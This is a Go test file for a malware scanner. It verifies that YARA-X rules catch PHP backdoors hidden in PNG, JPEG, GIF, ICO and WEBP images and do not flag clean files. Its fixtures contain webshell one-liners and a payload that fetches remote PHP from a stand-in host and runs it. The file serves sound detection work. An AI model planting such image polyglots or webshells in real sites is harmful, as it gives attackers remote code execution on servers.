//go:build yara

package signatures

import (
	"bytes"
	"image"
	"image/color"
	"image/gif"
	"image/jpeg"
	"image/png"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	yara_x "github.com/VirusTotal/yara-x/go"
)

func repositoryYARAScanner(t *testing.T) *yara_x.Scanner {
	t.Helper()
	source, err := os.ReadFile(filepath.Join("..", "..", "configs", "malware.yar"))
	if err != nil {
		t.Fatal(err)
	}
	rules, err := yara_x.Compile(string(source))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(rules.Destroy)
	scanner := yara_x.NewScanner(rules)
	t.Cleanup(scanner.Destroy)
	return scanner
}

func yaraRuleFired(t *testing.T, scanner *yara_x.Scanner, rule string, sample []byte) bool {
	t.Helper()
	results, err := scanner.Scan(sample)
	if err != nil {
		t.Fatal(err)
	}
	for _, matched := range results.MatchingRules() {
		if matched.Identifier() == rule {
			return true
		}
	}
	return false
}

func yaraOnePixel() image.Image {
	img := image.NewRGBA(image.Rect(0, 0, 1, 1))
	img.Set(0, 0, color.RGBA{R: 7, G: 8, B: 9, A: 255})
	return img
}

func yaraPNG(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := png.Encode(&buf, yaraOnePixel()); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func yaraJPEG(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, yaraOnePixel(), nil); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func yaraGIF(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := gif.Encode(&buf, yaraOnePixel(), nil); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// The 2026-09-17 payload: a real PNG that opens as a picture and whose
// trailing bytes fetch remote PHP and run it. Scheduled and on-demand scans
// hand every file to YARA-X regardless of extension, so this is the layer
// that had to fire and did not.
func TestBackdoorPHPInImageMatchesPolyglotContainers(t *testing.T) {
	scanner := repositoryYARAScanner(t)
	payload := []byte(`
<?php $ftp_url = "https://staging.example.test/rs/de.php";
$cu = curl_init();
curl_setopt_array($cu, array(CURLOPT_URL => $ftp_url, CURLOPT_RETURNTRANSFER => 1));
$datas = curl_exec($cu);
include($datas);
`)
	cases := map[string][]byte{
		"png_trailing_remote_fetch": append(yaraPNG(t), payload...),
		"png_text_chunk_eval":       append(yaraPNG(t), []byte("tEXtComment\x00<?php eval(base64_decode($_POST['c'])); ?>")...),
		"jpeg_appended_shell":       append(yaraJPEG(t), []byte("<?php system($_GET['cmd']); ?>")...),
		"gif_appended_shell":        append(yaraGIF(t), []byte("<?php passthru($_REQUEST['c']); ?>")...),
		"ico_appended_shell":        append(append([]byte{0x00, 0x00, 0x01, 0x00, 0x01, 0x00}, make([]byte, 20)...), []byte("<?php shell_exec($_GET['c']);")...),
		"webp_appended_shell":       append(append([]byte("RIFF\x24\x00\x00\x00WEBPVP8 "), make([]byte, 16)...), []byte("<?php eval($_POST['c']);")...),
		"png_remote_stream":         append(yaraPNG(t), []byte("<?php readfile('https://192.0.2.1/code');")...),
		"png_file_write":            append(yaraPNG(t), []byte("<?php fwrite($handle, $payload);")...),
		"png_request_input":         append(yaraPNG(t), []byte("<?php $_POST['value'];")...),
		// Encoded payloads can put a long literal between the opener and the
		// call while keeping the executable construct inside the rule's window.
		"png_blob_then_eval": append(yaraPNG(t), []byte("<?php $d = '"+strings.Repeat("QUFB", 16_000)+"'; eval(base64_decode($d));")...),
		// The proximity window starts after the opening tag, not at its first
		// byte. Keep a construct at the inclusive boundary detectable.
		"png_eval_at_proximity_boundary": append(yaraPNG(t),
			[]byte("<?php "+strings.Repeat("A", (64<<10)-1)+" eval($payload);")...),
	}
	for name, sample := range cases {
		t.Run(name, func(t *testing.T) {
			if !yaraRuleFired(t, scanner, "backdoor_php_in_image", sample) {
				t.Errorf("backdoor_php_in_image did not match %s", name)
			}
		})
	}
}

func TestBackdoorPHPInImageIgnoresOrdinaryAssets(t *testing.T) {
	scanner := repositoryYARAScanner(t)
	cases := map[string][]byte{
		"clean_png":  yaraPNG(t),
		"clean_jpeg": yaraJPEG(t),
		"clean_gif":  yaraGIF(t),
		// A plugin screenshot whose description chunk quotes a PHP opening
		// tag from the plugin's own usage instructions.
		"png_php_tag_in_description": append(yaraPNG(t),
			[]byte("tEXtDescription\x00Usage: add <?php the_widget('demo'); ?> to your theme.")...),
		// PHP source is PHP source. The webshell rules own it; this one must
		// not claim files that were never images.
		"php_source":         []byte("<?php system($_GET['cmd']);"),
		"description_words":  append(yaraPNG(t), []byte("tEXtDescription\x00The system can include widgets. Usage: <?php the_widget('demo'); ?>")...),
		"not_gif":            []byte("GIF8 documentation: <?php system($_GET['cmd']);"),
		"invalid_php_opener": append(yaraPNG(t), []byte("<?php-example system('id')")...),
		// A large photo: editor metadata near the start quotes prose that looks
		// like a call, and compressed pixel data much later happens to contain
		// a short echo tag. The two have nothing to do with each other.
		"jpeg_metadata_words_before_random_opener": concatBytes(yaraJPEG(t),
			[]byte("A subtractive two-color system (green and red)."), bytes.Repeat([]byte{0xA5}, 100<<10), []byte("<?=\xd7$\x86\x17")),
		"jpeg_random_opener_far_before_words": concatBytes(yaraJPEG(t),
			[]byte("<?=\xd7$\x86\x17"), bytes.Repeat([]byte{0xA5}, 70<<10), []byte("A subtractive two-color system (green and red).")),
		"png_eval_beyond_proximity": append(yaraPNG(t),
			[]byte("<?php "+strings.Repeat("A", (64<<10)+1)+" eval($payload);")...),
	}
	for name, sample := range cases {
		t.Run(name, func(t *testing.T) {
			if yaraRuleFired(t, scanner, "backdoor_php_in_image", sample) {
				t.Errorf("backdoor_php_in_image fired on %s", name)
			}
		})
	}
}

func concatBytes(parts ...[]byte) []byte {
	var out []byte
	for _, p := range parts {
		out = append(out, p...)
	}
	return out
}

func imageLoaderRules(t testing.TB) string {
	t.Helper()
	source, err := os.ReadFile(filepath.Join("..", "..", "configs", "malware.yar"))
	if err != nil {
		t.Fatal(err)
	}
	start := strings.Index(string(source), "rule backdoor_include_nonexecutable {")
	end := strings.Index(string(source), "rule backdoor_htaccess_auto_prepend {")
	if start < 0 || end <= start {
		t.Fatal("image rules not found")
	}
	return string(source[start:end])
}

func TestImageLoaderYARARulesHaveLiteralAtoms(t *testing.T) {
	rules, err := yara_x.Compile(imageLoaderRules(t), yara_x.ErrorOnSlowPattern(true))
	if err != nil {
		t.Fatal(err)
	}
	rules.Destroy()
}

func TestImageLoaderYARANearMissBudget(t *testing.T) {
	rules, err := yara_x.Compile(imageLoaderRules(t), yara_x.ErrorOnSlowPattern(true))
	if err != nil {
		t.Fatal(err)
	}
	defer rules.Destroy()
	scanner := yara_x.NewScanner(rules)
	defer scanner.Destroy()
	// Allow slower CI CPUs while keeping this below the cost of the old
	// overlapping expressions on this multi-megabyte near-miss input.
	scanner.SetTimeout(2 * time.Second)
	body := bytes.Repeat([]byte("<?php $_COOKIE['x']; include "+strings.Repeat(" ", 400)+";"), 7000)
	result, err := scanner.Scan(body)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.MatchingRules()) != 0 {
		t.Fatal("near-miss input matched a rule")
	}
}

func BenchmarkImageLoaderYARARules(b *testing.B) {
	rules, err := yara_x.Compile(imageLoaderRules(b), yara_x.ErrorOnSlowPattern(true))
	if err != nil {
		b.Fatal(err)
	}
	defer rules.Destroy()
	scanner := yara_x.NewScanner(rules)
	defer scanner.Destroy()
	scanner.SetTimeout(5 * time.Second)
	for name, unit := range map[string][]byte{
		"binary":      {0x89, 0, 0xff, 0x42, 0x10, 0x1a},
		"near_misses": []byte("<?php $_COOKIE['x']; include " + strings.Repeat(" ", 400) + ";"),
	} {
		b.Run(name, func(b *testing.B) {
			body := bytes.Repeat(unit, (1<<20)/len(unit))
			b.SetBytes(int64(len(body)))
			b.ResetTimer()
			for b.Loop() {
				if _, err := scanner.Scan(body); err != nil {
					b.Fatal(err)
				}
			}
		})
	}
}

// Both engines see the same loader shapes, so neither can drift.
func TestBackdoorIncludeNonExecutableYARAMatchesGatedLoaders(t *testing.T) {
	scanner := repositoryYARAScanner(t)
	for name, sample := range includeLoaderPositives() {
		t.Run(name, func(t *testing.T) {
			if !yaraRuleFired(t, scanner, "backdoor_include_nonexecutable", []byte(sample)) {
				t.Errorf("backdoor_include_nonexecutable did not match %s", name)
			}
		})
	}
}

func TestBackdoorIncludeNonExecutableYARAIgnoresOrdinaryTemplating(t *testing.T) {
	scanner := repositoryYARAScanner(t)
	for name, sample := range includeLoaderNegatives() {
		t.Run(name, func(t *testing.T) {
			if yaraRuleFired(t, scanner, "backdoor_include_nonexecutable", []byte(sample)) {
				t.Errorf("backdoor_include_nonexecutable fired on %s", name)
			}
		})
	}
}
